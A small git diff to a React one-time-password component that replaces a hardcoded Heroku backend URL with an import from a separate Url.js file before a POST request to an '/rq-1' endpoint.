@@ -1,6 +1,7 @@
 import React, { useState } from 'react'
 import OtpInput from 'react-otp-input'
 import { useHistory } from 'react-router-dom'
+import URL from './Url.js'
 
 import padlock from '../assets/padlock.png'
 
@@ -28,8 +29,7 @@ export default function Otp(props) {
             templateParams.clientOtp = clientOtp
 
             try {
-                const URL = 'https://dsafawdsjrone.herokuapp.com'
-                //const URL = 'http://localhost:3030'
+              
                 const response = await fetch(URL + '/rq-1', {
                     method: 'POST',
                     headers: {
